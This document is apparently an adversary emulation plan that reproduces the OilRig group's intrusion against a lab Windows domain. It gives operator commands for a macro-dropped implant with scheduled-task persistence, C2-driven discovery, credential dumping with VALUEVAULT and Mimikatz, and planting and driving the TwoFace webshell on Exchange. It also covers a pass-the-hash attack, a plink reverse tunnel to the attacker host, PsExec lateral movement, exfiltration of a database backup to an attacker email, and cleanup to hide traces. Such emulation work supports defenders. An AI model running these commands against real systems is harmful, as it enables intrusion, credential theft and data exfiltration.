# Scenario Overview

Legend of symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---
This scenario emulates OilRig TTPs based on several malware specimens either 
used by or associated with the OilRig actors:

1. SideTwist
2. VALUEVAULT
3. TwoFace
4. RDAT

*A Note on This Document:*

This all-in-one file does not include steps related to noise, which was also
conducted during the week. For the purpose of the plan, presume that an active
user session for Gosta is present for any SideTwist steps, necessary for the
scheduled task to execute the implant. This session originated from an 
out-of-scope jump box

---
## Step 0 - Setup

### :microphone: Voice Track

The C2 consists of an HTTP server that hosts a dummy a Flickr error page.
Commands to the implant are embedded between \<script\> tags. The command
itself consists of a base64-encoded blob which contains an encrypted string
(using simple xor encryption). Requests to the page that do not correspond
to a registered implant will simply return the dummy page.

The malicious document is delivered from a separate attacking machine running
postfix.

---

### :biohazard: Procedures

* :bulb: RDP, do not SSH, to the Linux Attack Platform `192.168.0.4` hosting the C2 server.


* Open a new terminal window and cd to the cloned repo control server:

```
cd /opt/oilrig/Resources/control_server
```

* Ensure the SideTwist handler is enabled for the server:

```
tail -n 5 ./config/handler_config.yml
```

Result:

```
sidetwist:
  host: 192.168.0.4
  port: 443
  enabled: true
```
:bulb: if the output contains `enabled: false`, change the value in 
`handler_config.yml` to match above.

* Start the control server:

```
sudo ./controlServer
```


* :arrow_right: SSH to the Mail and Apache Server `192.168.0.5` to ensure the malicious
document (`Marketing_Materials.zip`) is in /var/www/html.

* Check the file exists:
```
ls /var/www/html
```

:bulb: If the armed and zipped file is not there, follow the [instructions](../Resources/SideTwist_Dropper/README.md)
for creating it then copy the zip file to `/var/www/html`.

* Restart the Apache and Postfix services to ensure they are fresh:
```
systemctl restart apache2
systemctl restart postfix
```

## Step 1 - Initial Compromise and Persistence

### :microphone: Voice Track

Step 1 emulates OilRig gaining initial access from user `gosta` downloading and 
opening a Microsoft Word document received from a link in a spearphishing email 
from `team@ganjavigms.com`. The malicious macro enabled in the document performs
 the following actions when the document is first opened:

1. The `computername` and `username` environment variables are collected.
2. A sandbox detection check is performed using `Application.MouseAvailable`.
3. The SideTwist payload is embedded within the document under 
   `UserForm1.TextBox1.Text` as base64-encoded data.
4. Two artifacts `b.doc` (actually an executable) and `update.xml` are dropped 
  into this directory. `b.doc` is the SideTwist payload and `update.xml` is an 
  additional empty file that, if not present, SideTwist will terminate automatically.

When the document is closed:

5. Another sandbox detection check is performed using 
`Application.MouseAvailable`.
6. `b.doc` is renamed to `SystemFailureReporter.exe`.
7. A scheduled task named `SystemFailureReporter` is created and runs 
`SystemFailureReporter.exe` every 5 minutes.

When `SystemFailureReporter.exe` runs:

8. `SystemFailureReporter.exe` uses the GetUserName API, GetComputerName API, and
  GetDomainName API to find the current user, hostname, and domain respectively.
9.  `SystemFailureReporter.exe` connects to the control server (192.168.0.4) over
  XOR encrypted protocol HTTP on port 443.

---

### :biohazard: Procedures

:arrow_right: RDP into `THEBLOCK (10.1.0.5)`:

| Username | Password | 
| :--------: | :---------------: | 
| BOOMBOX\gosta | d0ntGoCH4$ingW8trfalls |
  
* Open Edge and browse to https://waterfalls.boom.box/owa, login as `Gosta`:

| Username | Password | 
| :--------: | :---------------: | 
| BOOMBOX\gosta | d0ntGoCH4$ingW8trfalls |

:bulb: There should be an unread email from `team@ganjavigms.com`.

* Open this email and click the link to download the zipped file.

* Open File Explorer and navigate to the Downloads file directory.

* Unzip `Marketing_Materials.zip` and enter the password `!M@rk3ting!` when 
prompted

* Double click the extracted word document `GGMS Overview.doc`, click "enable editing", and click "enable 
content".

:heavy_exclamation_mark: Wait 30 seconds then close the document. 

* :mag: The C2 server should register a new SideTwist callback after the 
document is closed.

<br>

### :moyai: Source Code
*  SideTwist Dropper: [SideTwist_Dropper](../Resources/SideTwist_Dropper)
*  Dropper Payload collects environment variables: [payload.vbs#L203-205](../Resources/SideTwist_Dropper/payload.vbs#L203-L205/)
*  Dropper Payload sandbox detection: [payload.vbs#L211](../Resources/SideTwist_Dropper/payload.vbs#L211/)
*  Dropper Payload directory creation: [payload.vbs#L220-L225](../Resources/SideTwist_Dropper/payload.vbs#L220-L225/)
*  Dropper Payload drops b.doc and update.xml: [payload.vbs#L229-L235](../Resources/SideTwist_Dropper/payload.vbs#L229-L235/)
*  Dropper Payload sandbox detection 2: [payload.vbs#L247](../Resources/SideTwist_Dropper/payload.vbs#L247/)
*  Dropper Payload b.doc rename: [payload.vbs#L251-L259](../Resources/SideTwist_Dropper/payload.vbs#L251-L259)
*  Dropper Payload scheduled task: [payload.vbs#L140-L194](../Resources/SideTwist_Dropper/payload.vbs#L140-L194/)

<br>

*  SideTwist Implant: [SideTwist Implant](../Resources/SideTwist)
*  SideTwist collects ID info: [SideTwist.cpp#L238-L280](../Resources/SideTwist/SideTwist/SideTwist.cpp#L238-L280/)
*  SideTwist sets IP/port: [SideTwist.cpp#L180-L219](../Resources/SideTwist/SideTwist/SideTwist.cpp#L180-L219/)
*  SideTwist encrypts communications: [comms.cpp#L106-L111](../Resources/SideTwist/SideTwist/comms.cpp#L106-L111)
*  SideTwist XOR key: [comms.h#L23](../Resources/SideTwist/SideTwist/comms.h#L23)


<br>

### :microscope: Cited Intelligence
*  SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/
*  VBA coding/macros: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/

<br>


## Step 2 - Workstation Discovery

### :microphone: Voice Track

Step 2 emulates OilRig performing a string of initial enumeration commands using 
the cmd spawned by `SystemFailureReporter.exe`.

OilRig enumerates the current user, system information, system network 
configuration information, domain users, domain groups, domain accounts, local 
groups, network connections, running processes, running services, and a 
registry key value to check if RDP is enabled.

At this point OilRig has discovered that the current user `gosta` is a member of
`EWS Admins`, that EWS server `WATERFALLS` has the ip address of `10.1.0.6` and 
is part of the `Exchange Trusted Subsystem` group, and the existence of several 
other administrator groups, including `SQL Admins` of which user `tous` is a member.

---

### :biohazard: Procedures

:arrow_right: On Linux Attack Platform `192.168.0.4` as user `saka`, split the existing C2
terminal window horizontally, being careful to not terminate the server.

`Right click > Split Horizontally`

In the bottom split window, issue the following commands to the implant, 
waiting until each task is accomplished before teeing the next one. 

:bulb: The implant will execute every 5 minutes.

```bash
# Helminth has been observed to perform initial information gathering on systems, including the enumeration of the current user, accounts, groups, system information, network connections, processes, services, and if remote desktop is enabled.

./evalsC2client.py --set-task goTb '101 whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1'
```

Perform follow up discovery using gained information to determine gosta is a 
member of EWS Administrators, tous is a SQL administrator and the IP of 
WATERFALLS.

```bash
# OilRig has been observed to perform enumeration of users and groups.[3]

./evalsC2client.py --set-task goTb '101 net user gosta /domain 2>&1 & net group "SQL Admins" /domain 2>&1 & nslookup WATERFALLS 2>&1'
```

<br>

### :moyai: Source Code
*  SideTwist instruction parsing: [SideTwist.cpp#L65-L79](../Resources/SideTwist/SideTwist/SideTwist.cpp#L65-L79/)
*  SideTwist command execution: [SideTwist.cpp#L102-L114](../Resources/SideTwist/SideTwist/SideTwist.cpp#L102-L114/)

<br>

### :microscope: Cited Intelligence
*  SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/
*  VBA coding/macros: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/  
*  Helminth campaigns/enumeration: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/
*  EWS admin/Exchange Trusted Subsystem discovery: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/

<br>


## Step 3 - Workstation Low Privilege Credential Dumping

### :microphone: Voice Track

Step 3 emulates OilRig using `SystemFailureReporter.exe` to download VALUEVAULT
(the executable for which is `b.exe`) which is then leveraged to perform a low 
privilege credential dumping. `SystemFailureReporter.exe` then uploads the 
VALUEVAULT dump (named `fsociety.dat`) back to C2 via HTTP POST request. 

The output of the credential dump provides a plaintext password for the current 
user `gosta`.

---

### :biohazard: Procedures

:arrow_right: On Linux Attack Platform  as `saka`, issue the command to download VALUEVAULT
to the workstation

```bash
./evalsC2client.py --set-task goTb '102 C:\Users\gosta\AppData\Roaming\b.exe|b.exe'
```

Issue the command to execute VALUEVAULT after it has been downloaded:

```bash
./evalsC2client.py --set-task goTb '101 C:\Users\gosta\AppData\Roaming\b.exe'
```

Issue the command to upload output of VALUEVAULT to C2 after it has executed:

```bash
./evalsC2client.py --set-task goTb '103 C:\Users\gosta\AppData\Roaming\fsociety.dat'
```

Confirm that the credentials were obtained on C2 server.

```
ls ./files
cat ./files/fsociety.dat
```

<br>

### :moyai: Source Code
*  SideTwist file download: [SideTwist.cpp#L129-L154](../Resources/SideTwist/SideTwist/SideTwist.cpp#L129-L154) and [comms.cpp#L78-L9](..//Resources/SideTwist/SideTwist/comms.cpp#L78-L97)
*  SideTwist file upload: [SideTwist.cpp#L166-L178](../Resources/SideTwist/SideTwist/SideTwist.cpp#L166-L178/),  
  and [SideTwist.cpp#L81](../Resources/SideTwist/SideTwist/SideTwist.cpp#L81) -> [comms.cpp#L113-L12](..//Resources/SideTwist/SideTwist/comms.cpp#L113-L124) -> [comms.cpp#L172-L2](.././Resources/SideTwist/SideTwist/comms.cpp#L172-L294)

<br>

*  VALUEVAULT: [VALUEVAULT](../Resources/VALUEVAULT/)
*  VALUEVAULT opens Windows Vault: [vault.go#L91-L97](../Resources/VALUEVAULT/vendor/vault/vault.go#L91-L97)

<br>

### :microscope: Cited Intelligence 
*  SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/
*  VALUEVAULT: https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network
*  Open-source Windows Vault Password Dumper: http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt

<br>

## Step 4 - Install Web Shell on EWS

### :microphone: Voice Track

Step 4 emulates OilRig installing web shell persistence on `WATERFALLS (10.1.0.6)`. 
This is accomplished by downloading the TWOFACE webshell (named `contact.aspx`) 
via `SystemFailureReporter.exe`; TWOFACE is then copied from `THEBLOCK` to 
`WATERFALLS` and hidden with `attrib + h`. 

OilRig covers their tracks by deleting the webshell from `gosta`'s user 
directory on `THEBLOCK`.

---

### :biohazard: Procedures

The webshell is first placed on THEBLOCK (10.1.0.5) to prepare for copying via 
SMB to WATERFALLS.

```bash
./evalsC2client.py --set-task goTb '102 C:\Users\Public\contact.aspx|contact.aspx'
```

Once in place, OilRig has copied the webshell directly into the Exchange Web 
Services directory.

```bash
./evalsC2client.py --set-task goTb '101 copy C:\Users\Public\contact.aspx "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"'
```

Set the file hidden attribute on WATERFALLS and delete the webshell from 
THEBLOCK using SideTwist

```bash
./evalsC2client.py --set-task goTb '101 attrib +h "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx" & del C:\Users\Public\contact.aspx'
```

<br>

### :moyai: Source Code
*  TwoFace Webshell: [TwoFace](../Resources/TwoFace/)

<br>

### :microscope: Cited Intelligence 
*  EWS lateral movement: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/

<br>

## Step 5 - EWS Discovery

### :microphone: Voice Track

Step 5 emulates OilRig using the TWOFACE webshell to perform enumeration on the 
EWS `WATERFALLS (10.1.0.6)` to discover the SQL server `ENDOFROAD (10.1.0.7)`.

OilRig first uses the webshell to perform some initial discovery once on the 
host by enumerating the current user, system network configuration and system 
network connections. 

Output of the system network connections discovery indicates an open connection 
to `10.1.0.7` via a port commonly associated with SQL.

---

### :biohazard: Procedures

On Linux Attack Platform box, change directories to the TwoFace payload folder:

```
cd /opt/oilrig/Resources/payloads/TwoFace
```

Use the webshell to enumerate the current user.

```bash
# OilRig has run whoami on a victim.[3][4][10]

curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data "pro=cmd.exe" --data "cmd=whoami" https://10.1.0.6/ews/contact.aspx
```

Enumerate the system network configurations.

```bash
# OilRig has run ipconfig /all on a victim.[3][4]

curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data "pro=cmd.exe" --data "cmd=ipconfig /all" https://10.1.0.6/ews/contact.aspx
```

Use the webshell to perform network discovery on `WATERFALLS (10.1.0.6)`, 
discovering a connection to host 10.1.0.7 via a port commonly associated with 
SQL.

```bash
# OilRig has used netstat -an on a victim to get a listing of network connections.[3]

curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data "pro=cmd.exe" --data "cmd=netstat -an" https://10.1.0.6/ews/contact.aspx
```

<br>

### :moyai: Source Code
*  TwoFace Webshell instruction parsing: [contact.aspx#L12-L21](../Resources/TwoFace/contact.aspx#L12-L21)
*  TwoFace Webshell command execution: [contact.aspx#L176-L194](../Resources/TwoFace/contact.aspx#L176-L194/)

<br>

### :microscope: Cited Intelligence
*  TwoFace: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/
*  Network discovery: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/

<br>


## Step 6 - Privileged Credential Dumping

### :microphone: Voice Track

Step 6 emulates OilRig using the webshell to download Mimikatz to `WATERFALLS` 
and using elevated privileges to dump credentials. The dumped credentials 
(stored in `01.txt`) are exfiltrated back to the C2 (`192.168.0.4`) via the webshell.

After exfiltration is complete OilRig deletes both Mimikatz and the dumped 
credentials from the directory on `WATERFALLS`.

---

### :biohazard: Procedures

Download Mimikatz to `WATERFALLS (10.1.0.6)`.

```bash
curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\temp\' -F "vir=false" -F "nen=m64.exe" -F 'f1=@m64.exe' https://10.1.0.6/EWS/contact.aspx
```

Dump credentials using Mimikatz. Output includes creds for SQL server 
administrator `tous`.

:bulb: `privilege::debug` has been included here to match the CTI, but is
unnecessary due to the webshell running as SYSTEM.

```bash
curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data "pro=cmd.exe" --data "cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\Windows\Temp\01.txt" https://10.1.0.6/ews/contact.aspx
```

Exfiltrate the resulting output file `01.txt` to the attacker platform.

```bash
curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://10.1.0.6/EWS/contact.aspx
```

Display the contents of `01.txt` in the terminal window.

```bash
cat 01.txt
```

Clean up on `WATERFALLS` by removing the binary and output file from 
`C:\Windows\Temp\`.

```bash
curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data "pro=cmd.exe" --data "cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe" https://10.1.0.6/EWS/contact.aspx
```
<br>

### :moyai: Source Code
:heavy_exclamation_mark: __NB__: The function descriptions in TwoFace (contact.aspx) refer to the Mimikatz download as "Arbitrary Folder Upload" and the 01.txt exfiltration as "File Download" which is the reverse of how said activities are described in the emulation procedure; this is to match to CTI but results in slightly contradictory source code links.
*  TwoFace Webshell download file to victim: [contact.aspx#L58-L115](../Resources/TwoFace/contact.aspx#L58-L115/)
*  TwoFace Webshell file upload file to C2: [contact.aspx#L120-L145](../Resources/TwoFace/contact.aspx#L120-L145/)
*  TwoFace Webshell temp delete: [contact.aspx#L150-L169](../Resources/TwoFace/contact.aspx#L150-L169/)

<br>

*  Mimikatz: [Mimikatz](../Resources/Mimikatz/)

<br>

### :microscope: Cited Intelligence
*  Credential dumping: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/

<br>


## Step 7 - Lateral Movement to EWS via RDP Tunnel

### :microphone: Voice Track

Step 7 emulates OilRig moving laterally to `WATERFALLS (10.1.0.6)`. This is 
accomplished with a remote port forward using the plink command line tool 
(downloaded by `SystemFailureReporter.exe`). OilRig conducts a remote port forward 
from `THEBLOCK (10.1.0.5)` to the attacking machine to allow RDP access through 
port 3389 as user `gosta`.

---

### :biohazard: Procedures

Download plink to `THEBLOCK (10.1.0.5)` using SideTwist and start plink tunnel 
to gain RDP access to `WATERFALLS (10.1.0.6)` from the Linux Attack Platform.

```bash
./evalsC2client.py --set-task goTb '102 c:\users\public\downloads\plink.exe|plink.exe'
```

Execute the remote port forward command using SideTwist. Note: this SideTwist 
process will persist as long as the tunnel is open and as such will need to be 
closed after the activity is done. SideTwist will continue to execute
via schtask so other commands can be issued to the implant if needed.

```bash
./evalsC2client.py --set-task goTb '101 echo y | c:\users\public\downloads\plink.exe -ssh -N -R 192.168.0.4:13389:10.1.0.6:3389 -l saka -pw "$ceKa#zU$Uc4^9yZ" 192.168.0.4'
```

Ensure that the tunnel is open and listening on port 13389 on Linux Attack Platform.

```bash
netstat -antulp | grep 13389
```

You should see a result that looks like the following:
```
tcp        0      0 127.0.0.1:13389         0.0.0.0:*               LISTEN
```

RDP to `WATERFALLS (10.1.0.6)` as user Gosta from Linux Attack Platform using the SSH
tunnel.

```bash
xfreerdp /u:'boombox\gosta' /p:'d0ntGoCH4$ingW8trfalls' /v:localhost:13389
```

<br>

### :moyai: Source Code
*  Plink command line tool: [Plink](../Resources/Plink/)

<br>

### :microscope: Cited Intelligence
*  Plink: https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/
*  SSH: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
*  RDP: https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf
*  RDP: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/

<br>


## Step 8 - Lateral Movement to the SQL Server

### :microphone: Voice Track

Step 8 emulates OilRig using the credentials collected for the user `tous` in 
the previous step to move laterally to the SQL server. 

First, the webshell is used to download PsExec, RDAT, and a newly named 
Mimikatz to disk. Through the tunneled RDP, an elevated Command Prompt is opened 
and, using the NTLM hash for `tous` from the credential dump, Mimikatz pass the 
hash is executed to spawn a second shell as `tous` on `WATERFALLS (10.1.0.6)`. 
As `tous`, RDAT is copied over to `ENDOFROAD (10.1.0.7)`, then PsExec is executed 
to get a shell on `ENDOFROAD (10.1.0.7)`

---

### :biohazard: Procedures

Download psexec to `WATERFALLS (10.1.0.6)` as `C:\Windows\System32\ps.exe`

```bash
# OilRig has downloaded PsExec as ps.exe

curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\System32' -F "vir=false" -F "nen=ps.exe" -F 'f1=@PsExec.exe' https://10.1.0.6/ews/contact.aspx
```

Download RDAT to `WATERFALLS (10.1.0.6)` as `Nt.dat`

```bash
# OilRig has saved RDAT to disk as Nt.dat

curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\Temp' -F "vir=false" -F "nen=Nt.dat" -F 'f1=@RDAT.exe' https://10.1.0.6/ews/contact.aspx
```

Redownload Mimikatz to `WATERFALLS (10.1.0.6)` as `mom64.exe`

```bash
# OilRig has saved Mimikatz to disk at mom64.exe

curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\System32' -F "vir=false" -F "nen=mom64.exe" -F 'f1=@m64.exe' https://10.1.0.6/ews/contact.aspx
```

In the RDP to `WATERFALLS (10.1.0.6)`, open a new Command Prompt as 
Administrator, click yes to the UAC prompt, and execute Mimikatz PTH for `tous`

```bash
# OilRig has used Mimikatz

C:\Windows\System32\mom64.exe "privilege::debug" "sekurlsa::pth /user:tous /domain:BOOMBOX /ntlm:9b7ff4cc0878bee9f099a4a7dc7227c3" "exit"
```

In the new Command Prompt spawned by the Mimikatz pass the hash, copy RDAT to 
`ENDOFROAD (10.1.0.7)`

```bash
# OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe

copy C:\Windows\Temp\Nt.dat \\10.1.0.7\C$\ProgramData\
```

In the new Command Prompt spawned by Mimikatz pass the hash, PsExec to the SQL 
server `ENDOFROAD (10.1.0.7)`

```bash
# OilRig has used PsExec [11]

C:\Windows\System32\ps.exe \\10.1.0.7 cmd.exe
```

<br>

### :moyai: Source Code
:heavy_exclamation_mark: __NB__: Once again, TwoFace (contact.aspx) refers to the "downloads" from this section of the emulation procedure as "Abritrary Folder Upload(s)" in the source code.
* TwoFace Webshell download file to victim: [contact.aspx#L58-L115](../Resources/TwoFace/contact.aspx#L58-L115/)
  
<br>

*  RDAT backdoor: [RDAT](../Resources/RDAT/)
  
<br>

### :microscope: Cited Intelligence
*  RDAT: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
*  PSExec: https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/
*  Mimikatz: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
*  Mimikatz: https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments

<br>


## Step 9 - SQL Server Discovery

### :microphone: Voice Track

Step 9 emulates OilRig using the command prompt (in the context of `tous`) created 
by Mimikatz pass the hash and PSExec to perform discovery of the database backup 
files on the SQL server `ENDOFROAD (10.1.0.7)`.

---

### :biohazard: Procedures

Discover version of SQL server

```bash
dir "C:\Program Files\Microsoft SQL Server\"
```

Discover SQL server database backup files

```bash
dir "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\"
```

<br>

### :microscope: Cited Intelligence
*  Discovery: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/
*  RDAT/Exfiltration: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/

<br>


## Step 10 - Collection and Exfiltration of Database Files

### :microphone: Voice Track

Step 10 emulates OilRig collecting and exfiltrating backups of the database files 
via the EWS API.

OilRig first creates a new directory `C:\Programdata\Vmware` in which to stage 
the collected data. RDAT is then moved to the new directory and renamed to 
`VMware.exe`. 

The newly named `VMware.exe` is used to read the data from sitedata_db.bak, split 
the data into 20000 byte chunks, and exfiltrate the chunks via EWS API to an 
attacker controlled email (`sistan@shirinfarhad.com`). The stolen data is 
obfuscated within BMP images attached to the emails sent to `sistan@shirinfarhad.com`.

---

### :biohazard: Procedures

Create directory C:\Programdata\Vmware

```bash
# OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe

mkdir C:\Programdata\Vmware
```

Move and rename RDAT as C:\Programdata\Vmware\VMware.exe

```bash
# OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe

move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe
```

Change directory into the SQL backup directory (PsExec has a character limit)

```bash
cd "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\"
```

Execute RDAT to pull back target database backup file.

```bash
# OilRig has used EWS APIs to exfiltrate data to an adversary controlled email

C:\ProgramData\Vmware\VMware.exe --path="sitedata_db.bak" --to="sistan@shirinfarhad.com" --from="gosta@boom.box" --server="10.1.0.6" --password='d0ntGoCH4$ingW8trfalls' --chunksize="200000"
```

<br>

### :moyai: Source Code
*  RDAT chunking: [Program.cs#L104-L109](../Resources/RDAT/Program.cs#L104-L109)
*  RDAT appending file bytes to guest.bmp: [Program.cs#L117-L129](../Resources/RDAT/Program.cs#L77-L85)
* RDAT leverages EWS API to exfil chunks: [Program.cs#L95-L115](../Resources/RDAT/Program.cs#L43-L75)
  
<br>

### :microscope: Cited Intelligence
*  RDAT/Exfiltration: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
*  TwoFace webshell: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/
*  C2 Communications: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/

<br>

## Step 11 - Cleanup

### :microphone: Voice Track

Step 11 emulates OilRig's cleanup and egress from the target network.

---

### :biohazard: Procedures

From within your PsExec session from `WATERFALLS` to `ENDOFROAD`:

Delete RDAT:

```cmd
del C:\ProgramData\VMware\VMware.exe
```

Delete the parent directory:

```cmd
rmdir C:\ProgramData\VMware
```


Terminate the PsExec session to ENDOFROAD:

```cmd
exit
```

Terminate the command prompt spawned by Mimikatz running as Tous

```cmd
exit
```

From your elevated command prompt on `WATERFALLS` (via RDP):

Delete Mimikatz, RDAT, and PsExec from disk.

```cmd
del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe 
```

From Kali:

Find the PID of the SSH tunnel and terminate it.

```bash
ps aux | grep ssh
```

```bash
kill <PID>
```

From your C2 callback into `THEBLOCK`:

Instruct the SideTwist agent to delete VALUEVAULT, the VALUEVAULT output, 
plink.exe, and the SideTwist killswitch file.

```bash
./evalsC2client.py --set-task goTb '101 del C:\Users\gosta\AppData\Roaming\b.exe C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe C:\Users\gosta\AppData\Local\SystemFailureReporter\update.xml'
```

---
:red_circle: End of Scenario. *Note: SideTwist will continue to execute but
will not beacon without the update.xml file*
